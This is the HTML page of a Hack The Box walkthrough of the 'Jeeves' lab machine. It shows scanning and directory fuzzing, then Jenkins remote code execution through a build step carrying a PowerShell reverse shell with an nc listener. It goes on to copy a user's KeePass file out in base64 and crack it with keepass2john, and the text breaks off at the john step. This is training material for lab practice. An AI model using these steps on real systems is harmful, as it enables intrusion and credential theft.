@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="#\rDescription\rJeeves is a fun box that starts with error messages. We directory fuzz with fuff and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator&rsquo;s hash in the user&rsquo;s KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server. #\rSkills Learned\rJenkins Modifying Project exploit KeePass hacking #\rSolution\r#\rFinding the vulnerability\rnmap shows open ports 80, 135,445, and 50000 .">
+<title>Jeeves</title>
+
+<link rel='canonical' href='https://pho3nix-jacki3.github.io/p/jeeves/'>
+
+<link rel="stylesheet" href="/scss/style.min.33b8a5c91ba8cfeb05ec46c3c5fdc518936151871fe775c2094cd25fd786d9e6.css"><meta property='og:title' content="Jeeves">
+<meta property='og:description' content="#\rDescription\rJeeves is a fun box that starts with error messages. We directory fuzz with fuff and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator&rsquo;s hash in the user&rsquo;s KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server. #\rSkills Learned\rJenkins Modifying Project exploit KeePass hacking #\rSolution\r#\rFinding the vulnerability\rnmap shows open ports 80, 135,445, and 50000 .">
+<meta property='og:url' content='https://pho3nix-jacki3.github.io/p/jeeves/'>
+<meta property='og:site_name' content='Blue Pho3nix'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Medium' /><meta property='article:tag' content='Windows' /><meta property='article:tag' content='TJNULL OSCP Prep' /><meta property='article:published_time' content='2024-05-14T07:07:07&#43;01:00'/><meta property='article:modified_time' content='2024-05-14T07:07:07&#43;01:00'/><meta property='og:image' content='https://pho3nix-jacki3.github.io/p/jeeves/jeeves-icon.png' />
+<meta name="twitter:title" content="Jeeves">
+<meta name="twitter:description" content="#\rDescription\rJeeves is a fun box that starts with error messages. We directory fuzz with fuff and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator&rsquo;s hash in the user&rsquo;s KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server. #\rSkills Learned\rJenkins Modifying Project exploit KeePass hacking #\rSolution\r#\rFinding the vulnerability\rnmap shows open ports 80, 135,445, and 50000 ."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://pho3nix-jacki3.github.io/p/jeeves/jeeves-icon.png' />
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hub0f1d2e872d992c9b1c42fc2f67b5ef1_147642_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Blue Pho3nix</a></h1>
+            <h2 class="site-description">Learn cool stuff</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Categories</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#skills-learned">Skills Learned</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#finding-the-vulnerability">Finding the vulnerability</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+    
+   
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: ; color: #fff;">
+                Hack The Box Walkthroughs
+            </a>
+        
+        
+    <section class="article-tags">
+        
+            <a href="/tags/medium/">Medium</a>
+        
+            <a href="/tags/windows/">Windows</a>
+        
+            <a href="/tags/tjnull-oscp-prep/">TJNULL OSCP Prep</a>
+        
+    </section>
+
+
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/jeeves/">Jeeves</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 14, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/jeeves/intro.png"
+	width="961"
+	height="494"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="466px"
+	
+></p>
+<h2 id="description">
+    <a href="#description" class="header-anchor">#</a>
+    Description
+</h2><blockquote>
+<p>Jeeves is a fun box that starts with error messages. We directory fuzz with fuff and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator&rsquo;s hash in the user&rsquo;s KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server.</p>
+</blockquote>
+<h2 id="skills-learned">
+    <a href="#skills-learned" class="header-anchor">#</a>
+    Skills Learned
+</h2><ul>
+<li>Jenkins Modifying Project  exploit</li>
+<li>KeePass hacking</li>
+</ul>
+<h1 id="solution">
+    <a href="#solution" class="header-anchor">#</a>
+    Solution
+</h1><h2 id="finding-the-vulnerability">
+    <a href="#finding-the-vulnerability" class="header-anchor">#</a>
+    Finding the vulnerability
+</h2><p><code>nmap</code> shows open ports 80, 135,445, and 50000 .</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nmap</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span><span class="o">=</span><span class="mi">1000</span> <span class="o">-</span><span class="n">T4</span> <span class="mf">10.10.10.63</span> <span class="o">-</span><span class="n">vv</span> <span class="o">-</span><span class="n">oN</span> <span class="n">ports</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/1.png"
+	width="967"
+	height="598"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="388px"
+	
+></p>
+<p>We  run <code>-sCV</code> on the open ports.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ls</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ports</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="n">ports</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">&#39;^[0-9]&#39;</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span> <span class="s1">&#39;/&#39;</span> <span class="o">-</span><span class="n">f</span> <span class="mi">1</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="o">|</span> <span class="n">sed</span> <span class="n">s</span><span class="o">/</span><span class="p">,</span><span class="err">$</span><span class="o">//</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">echo</span> <span class="err">$</span><span class="n">ports</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/2.png"
+	width="953"
+	height="530"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="431px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="err">$</span><span class="n">ports</span> <span class="mf">10.10.10.63</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">oN</span> <span class="n">version</span><span class="o">-</span><span class="n">basescripts</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/3.png"
+	width="1043"
+	height="839"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="298px"
+	
+></p>
+<hr>
+<p>We try to login to SMB, but it requires a password.</p>
+<p><img src="/p/jeeves/9.png"
+	width="961"
+	height="122"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="787"
+		data-flex-basis="1890px"
+	
+></p>
+<p>Port 50000 gives the 404 Not Found error listed with nmap.</p>
+<p><img src="/p/jeeves/4.png"
+	width="1145"
+	height="418"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="273"
+		data-flex-basis="657px"
+	
+></p>
+<p>Port 80 also gives an error, this time as an image.</p>
+<p><img src="/p/jeeves/5.png"
+	width="1343"
+	height="431"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="747px"
+	
+></p>
+<p><img src="/p/jeeves/6.png"
+	width="1102"
+	height="343"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="321"
+		data-flex-basis="771px"
+	
+></p>
+<p><img src="/p/jeeves/7.png"
+	width="1007"
+	height="337"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="717px"
+	
+></p>
+<p><img src="/p/jeeves/8.png"
+	width="993"
+	height="390"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="611px"
+	
+></p>
+<p>We run <code>Fuff</code> and find a <code>/askjeeves</code> directory on port 50000 that&rsquo;s running Jenkins.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ffuf</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">small</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">FUZZ</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.63</span><span class="p">:</span><span class="mi">50000</span><span class="o">/</span><span class="n">FUZZ</span> <span class="o">-</span><span class="n">recursion</span> <span class="o">-</span><span class="n">recursion</span><span class="o">-</span><span class="n">depth</span> <span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/10.png"
+	width="1552"
+	height="628"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<p><img src="/p/jeeves/11.png"
+	width="1139"
+	height="599"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="456px"
+	
+></p>
+<h2 id="foothold">
+    <a href="#foothold" class="header-anchor">#</a>
+    Foothold
+</h2><p>We find a RCE exploit for Jenkins at <a class="link" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-project"  target="_blank" rel="noopener"
+    >Jenkinds RCE Creating Modifying Project</a></p>
+<ol>
+<li>Create a <code>New Item</code></li>
+</ol>
+<p><img src="/p/jeeves/12.png"
+	width="954"
+	height="802"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="118"
+		data-flex-basis="285px"
+	
+></p>
+<ol start="2">
+<li><code>Enter an item Name</code>, choose <code>freestyle project</code>, and click <code>OK</code>.</li>
+</ol>
+<p><img src="/p/jeeves/13.png"
+	width="945"
+	height="754"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="125"
+		data-flex-basis="300px"
+	
+></p>
+<ol start="3">
+<li>Scroll down to build and add the <code>Execute Windows batch command</code> build step.</li>
+</ol>
+<p><img src="/p/jeeves/14.png"
+	width="923"
+	height="347"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="638px"
+	
+>
+<img src="/p/jeeves/15.png"
+	width="950"
+	height="275"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="345"
+		data-flex-basis="829px"
+	
+></p>
+<ol start="4">
+<li>Create a <code>PoweShell #3 base64</code> encoded reverse shell at <a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
+    >https://www.revshells.com/</a></li>
+</ol>
+<p><img src="/p/jeeves/16.png"
+	width="1419"
+	height="1004"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="141"
+		data-flex-basis="339px"
+	
+></p>
+<ol start="5">
+<li>Paste the rev shell into <code>Command</code> and click <code>Apply</code>.</li>
+</ol>
+<p><img src="/p/jeeves/17.png"
+	width="950"
+	height="571"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+></p>
+<ol start="6">
+<li>Start your listener with <code>rwlrap</code></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rlwrap</span> <span class="o">-</span><span class="n">cAr</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="o">&lt;</span><span class="n">your</span> <span class="n">chosen</span> <span class="n">port</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="7">
+<li>Navigate to <code>http://10.10.10.63:50000/askjeeves/job/&lt;your job's name&gt;/</code> and click <code>Build Now</code>. This gives us a shell as user kohsuke.</li>
+</ol>
+<p><img src="/p/jeeves/18.png"
+	width="1892"
+	height="682"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="277"
+		data-flex-basis="665px"
+	
+></p>
+<p>We get the user flag on <code>c:\users\kohsuke\desktop</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> c:\users\
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/19.png"
+	width="949"
+	height="460"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="495px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">cd</span> c:\users\kohsuke\desktop
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/20.png"
+	width="948"
+	height="350"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="270"
+		data-flex-basis="650px"
+	
+></p>
+<h2 id="privilege-escalation">
+    <a href="#privilege-escalation" class="header-anchor">#</a>
+    Privilege Escalation
+</h2><p>We look around and find a <code>KeePass</code>file in the <code>c:\users\kohsuke\documents</code>directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">cd</span> ..\Documents
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/21.png"
+	width="960"
+	height="426"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="540px"
+	
+></p>
+<p>We move the file over to our attack box with base64  in powershell.</p>
+<p><strong>On Windows:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-path</span> <span class="s2">&#34;C:\users\kohsuke\documents\ceh.kdbx&#34;</span> <span class="n">-Encoding</span> <span class="n">byte</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/22.png"
+	width="1883"
+	height="539"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="349"
+		data-flex-basis="838px"
+	
+></p>
+<p><strong>On our attack box:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEA&lt;snip&gt;&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/23.png"
+	width="934"
+	height="804"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="278px"
+	
+></p>
+<p>We have <code>CEH.kdbx</code> on our local machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ls</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/24.png"
+	width="941"
+	height="187"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="503"
+		data-flex-basis="1207px"
+	
+></p>
+<p><img src="/p/jeeves/25.png"
+	width="962"
+	height="104"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="925"
+		data-flex-basis="2220px"
+	
+></p>
+<p>We use <code>kpcli</code> to get the passwords.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span> <span class="o">&amp;&amp;</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">kpcli</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We need the <code>CEH.kdbx</code> master password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">kpcli</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">open CEH.kdbx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/26.png"
+	width="969"
+	height="315"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="307"
+		data-flex-basis="738px"
+	
+></p>
+<p><code>keepass2john</code> helps us out.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">keepass2john</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span> <span class="o">&gt;</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span><span class="o">-</span><span class="nb">hash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/27.png"
+	width="1897"
+	height="334"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="567"
+		data-flex-basis="1363px"
+	
+></p>
+<p>Then we use <code>john</code> to get the master password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
